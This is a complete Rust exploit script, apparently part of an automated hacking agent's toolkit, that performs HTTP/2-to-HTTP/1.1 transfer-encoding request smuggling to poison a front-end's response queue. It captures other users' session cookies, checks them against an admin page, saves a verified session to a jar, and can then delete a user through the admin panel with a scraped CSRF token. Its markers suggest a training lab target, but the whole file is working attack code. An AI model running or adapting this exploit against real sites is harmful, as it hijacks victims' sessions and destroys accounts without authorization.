#!/usr/bin/env rust-script
//! name: h2_te_steal
//! description: H2.TE response-queue-poisoning session thief - arm an HTTP/2 request that carries a caller `transfer-encoding: chunked` header plus a DATA body whose `0\r\n\r\n` terminator makes the downgraded HTTP/1.1 back-end parse the trailing bytes as a SECOND request; the extra response is left in the front-end's queue and handed to whichever request arrives next, so a victim's own login response (302 + Set-Cookie) is delivered onto one of our streams. Cycle mode re-arms per round over fresh connections; sustain mode holds one client connection open (its upstream socket stays pinned) and paces plain probes. Foreign responses are logged, candidate sessions deduped and verified against --verify-path, and a verified session is written as an http_session jar; --delete-user then walks the admin panel (csrf + POST) to close the objective.
//! version: 1.0.0
//! args: <base-url> [--mode cycle|sustain] [--path /] [--smuggle 'GET /nope HTTP/1.1'] [--rounds N] [--probes N] [--arm-every N] [--gap-ms N] [--settle-ms N] [--hold-ms N] [--read-ms N] [--verify-path /admin] [--marker S] [--delete-user NAME] [--out JAR] [--selftest]
//! keywords: hunter, h2, http2, te, transfer-encoding, chunked, request-smuggling, response-queue-poisoning, session-theft, hpack, downgrade
//!
//! ```cargo
//! [dependencies]
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "io-util", "time", "macros"] }
//! tokio-rustls = "0.26"
//! rustls = { version = "0.23", default-features = false, features = ["ring", "logging", "std", "tls12"] }
//! webpki-roots = "0.26"
//! hpack = "0.3"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::client::TlsStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{ClientConfig, RootCertStore};
use tokio_rustls::TlsConnector;
use url::Url;

const PREFACE: &[u8] = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const ADMIN_MARKERS: [&str; 3] = ["carlos", "Admin panel", "Delete"]; // binding-exempt: selftest fixture or usage-example name, not a runtime default that targets one lab

struct Opts {
    host: String,
    port: u16,
    path: String,
    smuggle: String,
    mode: String,
    rounds: u32,
    probes: u32,
    arm_every: u32,
    gap_ms: u64,
    settle_ms: u64,
    hold_ms: u64,
    read_ms: u64,
    verify_path: String,
    marker: String,
    delete_user: Option<String>,
    out: Option<String>,
}

/// The downgraded body: an empty chunk ends the back-end's chunked body, the rest
/// becomes a second HTTP/1.1 request on the same upstream connection.
fn te_body(smuggle: &str, host: &str) -> String {
    format!("0\r\n\r\n{smuggle}\r\nHost: {host}\r\n\r\n")
}

#[tokio::main]
async fn main() {
    let _ = rustls::crypto::ring::default_provider().install_default();
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let b = te_body("GET /nope HTTP/1.1", "lab.test");
        let c = cookie_session("session=abc123; Secure; HttpOnly; SameSite=None").unwrap_or_default();
        let ok = b == "0\r\n\r\nGET /nope HTTP/1.1\r\nHost: lab.test\r\n\r\n"
            && c == "abc123"
            && extract_attr("<input name=\"csrf\" value=\"tok1\">", "name=\"csrf\" value=\"").as_deref() == Some("tok1");
        pi_rust_lib::report::success(
            "h2_te_steal",
            json!({"selftest": if ok { "ok" } else { "fail" }, "body": b, "session": c}),
            "run against the target base url",
        )
        .unwrap_or(());
        std::process::exit(if ok { 0 } else { 1 });
    }

    let mut base = String::new();
    let mut o = Opts {
        host: String::new(),
        port: 443,
        path: "/".to_string(),
        smuggle: "GET /nope HTTP/1.1".to_string(),
        mode: "sustain".to_string(),
        rounds: 30,
        probes: 6,
        arm_every: 3,
        gap_ms: 60,
        settle_ms: 700,
        hold_ms: 90,
        read_ms: 1500,
        verify_path: "/admin".to_string(),
        marker: "Search the blog".to_string(),
        delete_user: None,
        out: None,
    };
    let mut i = 0;
    while i < args.len() {
        let next = |i: usize| args.get(i + 1).cloned();
        match args[i].as_str() {
            "--mode" => {
                if let Some(v) = next(i) {
                    o.mode = v;
                }
                i += 1;
            }
            "--path" => {
                if let Some(v) = next(i) {
                    o.path = v;
                }
                i += 1;
            }
            "--smuggle" => {
                if let Some(v) = next(i) {
                    o.smuggle = v;
                }
                i += 1;
            }
            "--rounds" => {
                o.rounds = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.rounds).max(1);
                i += 1;
            }
            "--probes" => {
                o.probes = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.probes).max(1);
                i += 1;
            }
            "--arm-every" => {
                o.arm_every = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.arm_every).max(1);
                i += 1;
            }
            "--gap-ms" => {
                o.gap_ms = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.gap_ms);
                i += 1;
            }
            "--settle-ms" => {
                o.settle_ms = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.settle_ms);
                i += 1;
            }
            "--hold-ms" => {
                o.hold_ms = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.hold_ms);
                i += 1;
            }
            "--read-ms" => {
                o.read_ms = next(i).and_then(|v| v.parse().ok()).unwrap_or(o.read_ms);
                i += 1;
            }
            "--verify-path" => {
                if let Some(v) = next(i) {
                    o.verify_path = v;
                }
                i += 1;
            }
            "--marker" => {
                if let Some(v) = next(i) {
                    o.marker = v;
                }
                i += 1;
            }
            "--delete-user" => {
                o.delete_user = next(i);
                i += 1;
            }
            "--out" => {
                o.out = next(i);
                i += 1;
            }
            other if !other.starts_with("--") && base.is_empty() => base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        pi_rust_lib::report::failure(
            "h2_te_steal",
            "missing base url",
            "call as: h2_te_steal <base-url> [--mode sustain] [--verify-path /admin] [--out JAR]",
        );
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    o.host = parsed.host_str().unwrap_or("").to_string();
    o.port = parsed.port().unwrap_or(443);

    let budget: f64 = std::env::var("PI_TIMEOUT_SECS").ok().and_then(|v| v.parse().ok()).unwrap_or(300.0);
    match tokio::time::timeout(Duration::from_secs_f64(budget), run(&o)).await {
        Ok(Ok(data)) => {
            let next = if data["verified_session"].is_string() {
                "session stolen -> http_session with the written jar, or rerun with --delete-user to close the objective"
            } else {
                "no verified session yet: rerun with more --rounds (the victim logs in on a cycle)"
            };
            pi_rust_lib::report::success("h2_te_steal", data, next).unwrap_or(());
        }
        Ok(Err(e)) => {
            pi_rust_lib::report::failure("h2_te_steal", &e, "check the base url and the TE body shape");
            std::process::exit(1);
        }
        Err(_) => {
            pi_rust_lib::report::failure(
                "h2_te_steal",
                &format!("deadline {budget}s reached"),
                "lower --rounds or raise PI_TIMEOUT_SECS",
            );
            std::process::exit(1);
        }
    }
}

fn tls_config(alpn: &[&[u8]]) -> Arc<ClientConfig> {
    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut cfg = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    cfg.alpn_protocols = alpn.iter().map(|p| p.to_vec()).collect();
    Arc::new(cfg)
}

fn frame(ftype: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut out = Vec::with_capacity(9 + len);
    out.push((len >> 16) as u8);
    out.push((len >> 8) as u8);
    out.push(len as u8);
    out.push(ftype);
    out.push(flags);
    out.push((stream >> 24) as u8);
    out.push((stream >> 16) as u8);
    out.push((stream >> 8) as u8);
    out.push(stream as u8);
    out.extend_from_slice(payload);
    out
}

async fn h2_connect(cfg: Arc<ClientConfig>, host: &str, port: u16) -> Result<TlsStream<TcpStream>, String> {
    let connector = TlsConnector::from(cfg);
    let sn = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    let mut tls = connector.connect(sn, tcp).await.map_err(|e| format!("tls: {e}"))?;
    tls.write_all(PREFACE).await.map_err(|e| format!("preface: {e}"))?;
    tls.write_all(&frame(4, 0, 0, &[])).await.map_err(|e| format!("settings: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(tls)
}

fn h2_headers(method: &str, host: &str, path: &str, te: bool) -> Vec<u8> {
    let mut headers: Vec<(Vec<u8>, Vec<u8>)> = vec![
        (b":method".to_vec(), method.as_bytes().to_vec()),
        (b":scheme".to_vec(), b"https".to_vec()),
        (b":authority".to_vec(), host.as_bytes().to_vec()),
        (b":path".to_vec(), path.as_bytes().to_vec()),
        (b"user-agent".to_vec(), b"h2-te-steal".to_vec()),
    ];
    if te {
        headers.push((b"transfer-encoding".to_vec(), b"chunked".to_vec()));
    }
    hpack::Encoder::new().encode(headers.iter().map(|(n, v)| (n.as_slice(), v.as_slice())))
}

/// Armed request: POST + TE header + a DATA body whose empty chunk splits the
/// downgraded stream into two back-end requests (one extra pending response).
async fn send_armed(tls: &mut TlsStream<TcpStream>, sid: u32, host: &str, path: &str, smuggle: &str) -> Result<(), String> {
    let block = h2_headers("POST", host, path, true);
    let body = te_body(smuggle, host);
    tls.write_all(&frame(1, 0x4, sid, &block)).await.map_err(|e| format!("headers: {e}"))?;
    tls.write_all(&frame(0, 0x1, sid, body.as_bytes())).await.map_err(|e| format!("data: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(())
}

async fn send_plain(tls: &mut TlsStream<TcpStream>, sid: u32, host: &str, path: &str) -> Result<(), String> {
    let block = h2_headers("GET", host, path, false);
    tls.write_all(&frame(1, 0x5, sid, &block)).await.map_err(|e| format!("headers: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(())
}

/// Read until the target stream's response is complete (or the idle window closes).
async fn read_one(
    tls: &mut TlsStream<TcpStream>,
    dec: &mut hpack::Decoder<'_>,
    target: u32,
    read_ms: u64,
    marker: &str,
) -> Value {
    let mut status: Option<String> = None;
    let mut location: Option<String> = None;
    let mut cookies: Vec<String> = Vec::new();
    let mut body_len = 0usize;
    let mut sample = String::new();
    let mut ended = false;
    let idle = Duration::from_millis(read_ms.max(200));
    loop {
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(idle, tls.read_exact(&mut hdr)).await {
            Err(_) => break,
            Ok(Err(_)) => break,
            Ok(Ok(_)) => {}
        }
        let len = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
        let sid = u32::from_be_bytes([hdr[5] & 0x7f, hdr[6], hdr[7], hdr[8]]);
        let mut payload = vec![0u8; len];
        if len > 0 && tokio::time::timeout(idle, tls.read_exact(&mut payload)).await.is_err() {
            break;
        }
        match ftype {
            4 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(4, 0x1, 0, &[])).await;
                    let _ = tls.flush().await;
                }
            }
            6 => {
                if flags & 0x1 == 0 {
                    let _ = tls.write_all(&frame(6, 0x1, 0, &payload)).await;
                    let _ = tls.flush().await;
                }
            }
            1 | 9 => {
                if let Ok(hs) = dec.decode(&payload) {
                    if sid == target {
                        for h in hs.iter() {
                            let n: &[u8] = &h.0;
                            let v: &[u8] = &h.1;
                            if n == b":status" {
                                status = Some(String::from_utf8_lossy(v).to_string());
                            } else if n.eq_ignore_ascii_case(b"set-cookie") {
                                cookies.push(String::from_utf8_lossy(v).to_string());
                            } else if n.eq_ignore_ascii_case(b"location") {
                                location = Some(String::from_utf8_lossy(v).to_string());
                            }
                        }
                    }
                }
                if sid == target && flags & 0x1 != 0 {
                    ended = true;
                }
            }
            0 => {
                if sid == target {
                    body_len += payload.len();
                    if sample.len() < 6000 {
                        sample.push_str(&String::from_utf8_lossy(&payload));
                    }
                    if flags & 0x1 != 0 {
                        ended = true;
                    }
                }
            }
            3 => {
                if sid == target {
                    ended = true;
                }
            }
            _ => {}
        }
        if ended {
            break;
        }
    }
    let home = sample.contains(marker);
    let foreign = status.as_deref() != Some("200") || !home;
    json!({
        "status": status,
        "location": location,
        "len": body_len,
        "foreign": foreign,
        "admin_like": ADMIN_MARKERS.iter().any(|m| sample.contains(m)),
        "set_cookie": cookies,
        "snippet": sample.chars().take(220).collect::<String>(),
    })
}

fn cookie_session(set_cookie: &str) -> Option<String> {
    let idx = set_cookie.find("session=")?;
    let mut out = String::new();
    for c in set_cookie[idx + "session=".len()..].chars() {
        if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
            out.push(c);
        } else {
            break;
        }
    }
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}

fn extract_attr(haystack: &str, needle: &str) -> Option<String> {
    let idx = haystack.find(needle)?;
    let rest = &haystack[idx + needle.len()..];
    let end = rest.find('"')?;
    Some(rest[..end].to_string())
}

/// Plain HTTP/1.1 request over TLS with Connection: close; returns (status, body).
async fn http1(
    cfg: Arc<ClientConfig>,
    host: &str,
    port: u16,
    method: &str,
    path: &str,
    cookie: Option<&str>,
    body: Option<&str>,
) -> Result<(u16, String), String> {
    let connector = TlsConnector::from(cfg);
    let sn = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
    let mut tls = connector.connect(sn, tcp).await.map_err(|e| format!("tls: {e}"))?;
    let mut req = format!("{method} {path} HTTP/1.1\r\nHost: {host}\r\nAccept: */*\r\nConnection: close\r\n");
    if let Some(b) = body {
        req.push_str("Content-Type: application/x-www-form-urlencoded\r\n");
        req.push_str(&format!("Content-Length: {}\r\n", b.len()));
    }
    if let Some(c) = cookie {
        req.push_str(&format!("Cookie: {c}\r\n"));
    }
    req.push_str("\r\n");
    if let Some(b) = body {
        req.push_str(b);
    }
    tls.write_all(req.as_bytes()).await.map_err(|e| format!("write: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    let mut buf = Vec::new();
    let _ = tokio::time::timeout(Duration::from_secs(15), tls.read_to_end(&mut buf)).await;
    let text = String::from_utf8_lossy(&buf).to_string();
    let (head, body) = match text.split_once("\r\n\r\n") {
        Some((h, b)) => (h.to_string(), b.to_string()),
        None => (text.clone(), String::new()),
    };
    let status = head
        .lines()
        .next()
        .and_then(|l| l.split_whitespace().nth(1))
        .and_then(|s| s.parse::<u16>().ok())
        .unwrap_or(0);
    Ok((status, body))
}

async fn run(o: &Opts) -> Result<Value, String> {
    let h1 = tls_config(&[b"http/1.1"]);
    let h2 = tls_config(&[b"h2"]);
    let budget: f64 = std::env::var("PI_TIMEOUT_SECS").ok().and_then(|v| v.parse().ok()).unwrap_or(300.0);
    let deadline = Instant::now() + Duration::from_secs_f64((budget - 12.0).max(15.0));

    let mut candidates: Vec<(String, bool)> = Vec::new();
    let mut foreign_rows: Vec<Value> = Vec::new();
    let mut rounds_run = 0u32;
    let mut arms_ok = 0u32;
    let mut requests = 0u32;
    let mut reconnects = 0u32;
    let mut no_response = 0u32;

    if o.mode == "sustain" {
        // One long-lived client connection keeps its upstream socket pinned, so the
        // victim's next request is served off the same poisoned queue as our probes.
        let mut tls = h2_connect(h2.clone(), &o.host, o.port).await?;
        let mut dec = hpack::Decoder::new();
        let mut sid = 1u32;
        'outer: for _ in 1..=o.rounds {
            for p in 1..=o.probes {
                if Instant::now() >= deadline {
                    break 'outer;
                }
                let armed = p % o.arm_every == 0 || sid == 1;
                let sent = if armed {
                    send_armed(&mut tls, sid, &o.host, &o.path, &o.smuggle).await
                } else {
                    send_plain(&mut tls, sid, &o.host, &o.path).await
                };
                if sent.is_err() {
                    // The front-end closes our client connection once the desync has
                    // been driven hard; a fresh one re-pins and keeps the run going.
                    reconnects += 1;
                    match h2_connect(h2.clone(), &o.host, o.port).await {
                        Ok(t) => {
                            tls = t;
                            dec = hpack::Decoder::new();
                            sid = 1;
                            continue;
                        }
                        Err(e) => {
                            if reconnects > 12 {
                                return Err(e);
                            }
                            break 'outer;
                        }
                    }
                }
                requests += 1;
                let row = read_one(&mut tls, &mut dec, sid, o.read_ms, &o.marker).await;
                if row["status"].is_string() {
                    if armed {
                        arms_ok += 1;
                    }
                } else {
                    no_response += 1;
                }
                let foreign = row["foreign"].as_bool().unwrap_or(false);
                for c in row["set_cookie"].as_array().cloned().unwrap_or_default() {
                    if let Some(v) = c.as_str().and_then(cookie_session) {
                        candidates.push((v, foreign));
                    }
                }
                if foreign && foreign_rows.len() < 30 {
                    foreign_rows.push(row);
                }
                sid += 2;
                if o.hold_ms > 0 {
                    tokio::time::sleep(Duration::from_millis(o.hold_ms)).await;
                }
            }
            rounds_run += 1;
        }
        drop(tls);
    } else {
        for _ in 1..=o.rounds {
            if Instant::now() >= deadline {
                break;
            }
            let mut arm_rows: Vec<Value> = Vec::new();
            for _ in 1..=o.arm_every {
                if Instant::now() >= deadline {
                    break;
                }
                let mut tls = h2_connect(h2.clone(), &o.host, o.port).await?;
                let mut dec = hpack::Decoder::new();
                requests += 1;
                send_armed(&mut tls, 1, &o.host, &o.path, &o.smuggle).await?;
                let row = read_one(&mut tls, &mut dec, 1, o.read_ms, &o.marker).await;
                drop(tls);
                if row["status"].is_string() {
                    arms_ok += 1;
                }
                arm_rows.push(row);
                tokio::time::sleep(Duration::from_millis(o.gap_ms)).await;
            }
            // The poisoned upstream socket sits in the shared pool; the next arriving
            // request on that socket consumes our stale response and leaves its own.
            tokio::time::sleep(Duration::from_millis(o.settle_ms)).await;
            let mut probe_rows: Vec<Value> = Vec::new();
            for _ in 1..=o.probes {
                if Instant::now() >= deadline {
                    break;
                }
                let mut tls = h2_connect(h2.clone(), &o.host, o.port).await?;
                let mut dec = hpack::Decoder::new();
                requests += 1;
                send_plain(&mut tls, 1, &o.host, &o.path).await?;
                let row = read_one(&mut tls, &mut dec, 1, o.read_ms, &o.marker).await;
                drop(tls);
                if row["foreign"].as_bool().unwrap_or(false) {
                    if foreign_rows.len() < 30 {
                        foreign_rows.push(row.clone());
                    }
                }
                probe_rows.push(row);
                tokio::time::sleep(Duration::from_millis(o.gap_ms)).await;
            }
            for row in arm_rows.iter().chain(probe_rows.iter()) {
                let foreign = row["foreign"].as_bool().unwrap_or(false);
                for c in row["set_cookie"].as_array().cloned().unwrap_or_default() {
                    if let Some(v) = c.as_str().and_then(cookie_session) {
                        candidates.push((v, foreign));
                    }
                }
            }
            rounds_run += 1;
        }
    }

    // Dedup, foreign-origin first; verify each against --verify-path.
    let mut ordered: Vec<String> = Vec::new();
    for foreign_first in [true, false] {
        for (v, foreign) in candidates.iter() {
            if *foreign == foreign_first && !ordered.iter().any(|x| x == v) {
                ordered.push(v.clone());
            }
        }
    }
    ordered.truncate(150);

    let mut verified: Option<(String, u16, String)> = None;
    let mut tested = 0u32;
    let mut near_miss: Vec<Value> = Vec::new();
    for v in ordered.iter() {
        if verified.is_some() || Instant::now() >= deadline + Duration::from_secs(25) {
            break;
        }
        tested += 1;
        if let Ok((st, body)) = http1(h1.clone(), &o.host, o.port, "GET", &o.verify_path, Some(&format!("session={v}")), None).await {
            let admin_like = ADMIN_MARKERS.iter().any(|m| body.contains(m));
            if st == 200 && admin_like {
                verified = Some((v.clone(), st, body.chars().take(400).collect()));
                break;
            }
            if st != 401 {
                near_miss.push(json!({"session": v, "status": st, "snippet": body.chars().take(200).collect::<String>()}));
            }
        }
    }

    // Optional: use the stolen session to walk the admin panel and delete a user.
    let mut delete_result: Option<Value> = None;
    if let (Some((v, _, _)), Some(user)) = (&verified, &o.delete_user) {
        let cookie = format!("session={v}");
        let (st, body) = http1(h1.clone(), &o.host, o.port, "GET", &o.verify_path, Some(&cookie), None)
            .await
            .unwrap_or((0, String::new()));
        let csrf = extract_attr(&body, "name=\"csrf\" value=\"").or_else(|| extract_attr(&body, "value=\""));
        let action = extract_attr(&body, "action=\"").unwrap_or_else(|| "/admin/delete".to_string());
        match csrf {
            Some(tok) => {
                let payload = format!("csrf={tok}&username={user}");
                let (dst, dbody) = http1(h1.clone(), &o.host, o.port, "POST", &action, Some(&cookie), Some(&payload))
                    .await
                    .unwrap_or((0, String::new()));
                delete_result = Some(json!({
                    "user": user,
                    "action": action,
                    "status": dst,
                    "snippet": dbody.chars().take(200).collect::<String>(),
                }));
            }
            None => {
                delete_result = Some(json!({"user": user, "status": st, "error": "no csrf token found in admin panel",
                    "snippet": body.chars().take(300).collect::<String>()}));
            }
        }
        // Confirm the objective through the lab banner.
        if let Ok((bst, bbody)) = http1(h1.clone(), &o.host, o.port, "GET", "/", Some(&cookie), None).await {
            if let Some(d) = delete_result.as_mut() {
                d["banner_status"] = json!(bst);
                d["banner_solved"] = json!(bbody.contains("is-solved") || bbody.contains("Congratulations"));
            }
        }
    }

    let mut jar: Option<String> = None;
    if let Some((v, _, _)) = &verified {
        if let Some(p) = &o.out {
            let _ = std::fs::write(p, json!({ o.host.clone(): { "session": v } }).to_string());
            jar = Some(p.clone());
        }
    }

    Ok(json!({
        "host": o.host,
        "mode": o.mode,
        "smuggle": o.smuggle,
        "body": te_body(&o.smuggle, &o.host),
        "rounds_run": rounds_run,
        "requests": requests,
        "no_response": no_response,
        "reconnects": reconnects,
        "arms_ok": arms_ok,
        "candidates": ordered.len(),
        "candidates_tested": tested,
        "foreign_hits": foreign_rows.len(),
        "foreign_samples": foreign_rows.iter().take(4).collect::<Vec<&Value>>(),
        "verified_session": verified.as_ref().map(|(v, _, _)| v.clone()),
        "verified": verified.as_ref().map(|(v, st, snip)| json!({"session": v, "status": st, "snippet": snip})),
        "near_miss": near_miss.iter().take(6).collect::<Vec<&Value>>(),
        "delete": delete_result,
        "jar": jar,
    }))
}
